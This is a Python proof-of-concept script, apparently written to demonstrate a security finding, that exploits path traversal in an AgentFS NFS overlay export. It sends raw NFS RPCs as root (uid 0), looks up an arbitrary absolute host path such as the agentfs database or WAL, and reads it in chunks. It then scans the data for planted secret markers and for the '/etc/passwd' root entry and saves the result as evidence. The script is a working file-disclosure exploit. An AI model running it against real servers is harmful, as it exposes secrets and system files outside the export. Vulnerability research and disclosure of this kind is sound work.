#!/usr/bin/env python3
"""Read the AgentFS SQLite delta DB/WAL through the NFS traversal and
scan for markers of previously copied-up files.

Prereqs: `agentfs serve nfs` overlay export at --host/--port, and the
path of the agentfs database (default <cwd>/.agentfs/<export>.db-wal)
reachable on the same host. Adjust --db accordingly.

Example:
  python3 nfs_db_read.py --outdir out/db --port 11112 \
      --db /path/to/.agentfs/myexport.db-wal
"""
import argparse
import datetime
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import nfs_traversal_capture as n


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--db", required=True,
                    help="absolute host path of the agentfs DB or WAL file")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=11111)
    ap.add_argument("--uid", type=int, default=0)
    ap.add_argument("--gid", type=int, default=0)
    ap.add_argument("--markers", nargs="*",
                    default=["V064-INSIDE-BASE-FILE", "V064-OUTSIDE-SECRET",
                             "V064-MODE600-SECRET", "root:x:0:0:root"],
                    help="byte strings to scan for in the DB/WAL content")
    ap.add_argument("--max-mb", type=int, default=64,
                    help="stop scanning after this many MB")
    args = ap.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    idx = [0]

    def rec(label, prog, proc, body):
        idx[0] += 1
        r, req, resp = n.rpc(args.host, args.port, prog, 3, proc, body,
                             args.uid, args.gid)
        n.save(outdir, idx[0], label, req, resp)
        return r

    r = rec("mnt", 100005, 1, n.X().s("/"))
    r.u32()
    root = r.op()
    r = rec("lookup_db", 100003, 3, n.X().op(root).s(args.db))
    st = r.u32()
    assert st == 0, st
    fh = r.op()
    obj = r.attrs()
    r.attrs()
    print("[+] LOOKUP", args.db, "size", obj["size"], "mode", oct(obj["mode"]))

    size = obj["size"]
    markers = [m.encode() for m in args.markers]
    found = {}
    off = 0
    chunk = 65536
    limit = min(size, args.max_mb * 1024 * 1024)
    while off < limit and len(found) < len(markers):
        r = rec(f"read_{off}", 100003, 6,
                n.X().op(fh).u64(off).u32(chunk))
        st = r.u32()
        assert st == 0, st
        r.attrs()
        cnt = r.u32()
        eof = r.u32()
        data = r.op()
        for marker in markers:
            if marker in data and marker not in found:
                found[marker] = off + data.find(marker)
        off += cnt
        if eof:
            break
    print("[+] markers found at offsets:",
          {k.decode(): v for k, v in found.items()})
    res = {"started_utc": datetime.datetime.now(datetime.timezone.utc)
           .isoformat().replace("+00:00", "Z"),
           "db_path": args.db, "db_size": size,
           "scanned_bytes": off,
           "markers": {k.decode(): v for k, v in found.items()},
           "finished_utc": datetime.datetime.now(datetime.timezone.utc)
           .isoformat().replace("+00:00", "Z")}
    (outdir / "result.json").write_text(json.dumps(res, indent=2) + "\n")
    print("[+] evidence ->", outdir)


if __name__ == "__main__":
    main()
